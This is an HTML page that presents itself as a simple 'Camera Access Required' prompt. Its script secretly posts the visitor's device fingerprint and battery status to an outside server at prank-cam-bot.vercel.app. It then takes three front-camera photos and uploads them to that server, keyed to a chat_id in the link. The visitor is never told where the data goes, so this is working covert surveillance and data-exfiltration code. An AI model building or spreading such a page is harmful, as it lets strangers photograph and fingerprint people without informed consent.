<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Camera Capture</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background:#000;
      color:#fff;
      text-align:center;
      font-family:sans-serif;
      padding-top:40px;
    }
    button {
      padding:15px 25px;
      font-size:18px;
      border:none;
      border-radius:8px;
      background:#ff3b3b;
      color:#fff;
      margin-top:20px;
    }
    #status {
      margin-top:20px;
      font-size:16px;
    }
  </style>
</head>
<body>

<h2>📸 Camera Access Required</h2>
<p id="status">Click below to allow camera & continue</p>

<button onclick="startAll()">Allow Camera</button>

<script>
const params = new URLSearchParams(location.search);
const chatId = params.get("chat_id");

const SERVER = "https://prank-cam-bot.vercel.app";

async function sendVisitorInfo() {
  let device = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: `${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    time: new Date().toLocaleString()
  };

  try {
    const battery = await navigator.getBattery();
    device.battery = {
      level: battery.level * 100,
      charging: battery.charging
    };
  } catch {}

  await fetch(`${SERVER}/visitor`, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      chat_id: chatId,
      device: device
    })
  });
}

async function sendPhoto(canvas, num) {
  fetch(`${SERVER}/send-photo`, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      chat_id: chatId,
      photo: canvas.toDataURL("image/jpeg", 0.5),
      number: `front-${num}`
    })
  });
}

async function capture(stream) {
  const video = document.createElement("video");
  video.srcObject = stream;
  await video.play();

  // ❌ remove delay completely

  for (let i = 1; i <= 3; i++) {
    const canvas = document.createElement("canvas");
    const videoWidth = video.videoWidth;
const videoHeight = video.videoHeight;

// 🔥 1:1 square crop (center)
const size = Math.min(videoWidth, videoHeight);

canvas.width = size;
canvas.height = size;

const ctx = canvas.getContext("2d");

ctx.drawImage(
  video,
  (videoWidth - size) / 2,
  (videoHeight - size) / 2,
  size,
  size,
  0,
  0,
  size,
  size
);

    sendPhoto(canvas, i);
  }
}

async function startAll() {
  if (!chatId) {
    document.getElementById("status").innerText = "Chat ID missing";
    return;
  }

  try {
    document.getElementById("status").innerText = "Sending info...";
    await sendVisitorInfo();

    document.getElementById("status").innerText = "Capturing...";

    // ✅ ONLY FRONT CAMERA (single permission)
    let stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: "user",
        width: { ideal: 1280 },
        height: { ideal: 720 }
      }
    });

    await capture(stream);

    stream.getTracks().forEach(t => t.stop());

    document.getElementById("status").innerText = "✅ Done";

  } catch (e) {
    document.getElementById("status").innerText = "❌ Permission denied / camera error";
  }
}
</script>

</body>
</html>
